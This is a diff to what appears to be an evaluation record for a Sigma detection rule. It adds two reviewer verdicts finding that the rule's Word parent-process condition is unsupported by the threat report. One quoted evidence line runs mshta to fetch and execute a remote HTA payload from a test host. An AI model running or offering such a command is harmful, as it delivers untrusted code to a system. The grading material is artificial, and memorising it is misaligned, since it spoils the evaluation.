@@ -107,6 +107,39 @@ events:
     dest_port: null
     name: null
 tamper_sigma_yaml: ''
-review: {}
+review:
+  verdicts:
+  - reviewer: R1
+    role: primary
+    verdict: present
+    confidence: 96
+    reasoning: The rule requires ParentImage|endswith '\winword.exe'. 'winword.exe' appears in neither
+      evidence quotation ('mshta.exe https://files.cranemail.test/portal/invoice.hta' and 'executed an
+      HTML application payload directly from the network'), and the report never mentions Word. The assumptions
+      list is empty. The other values (mshta.exe, http, .hta) do occur in the first quotation, so the
+      unsupported discriminating value is the parent process.
+    events_ok: true
+    incidental_issues:
+    - The title and description say 'from Word', which the report does not support; the report only says
+      'a child process' after an attachment was opened.
+    - The positive events use a WINWORD.EXE parent, which the report never states, but they are consistent
+      with the rule and genuinely show mshta fetching a remote HTA.
+    - 'I evaluated all six events by hand: both positives match, and the negatives and look-alikes do
+      not.'
+  - reviewer: R2
+    role: primary
+    verdict: present
+    confidence: 93
+    reasoning: 'Both evidence quotes are verbatim in the report. \mshta.exe, ''http'' and ''.hta'' occur
+      in the first quote. ParentImage|endswith ''\winword.exe'' (normalised: winword.exe) occurs in neither
+      quote, is not in any declared assumption (assumptions is empty), and does not appear anywhere in
+      the report text either (it only says ''a child process'' and ''ordinary Office activity''). So a
+      discriminating condition value is unsupported and G4 should stop it.'
+    events_ok: true
+    incidental_issues:
+    - Title ('From Word') and description assert a winword.exe parent that the report never states; the
+      positive events were built to match that unsupported parent.
+    - The falsepositives entry is generic, but all six events evaluate as labelled (positives match, negatives
+      and look-alikes do not).
 excluded: false
 exclusion_reason: ''
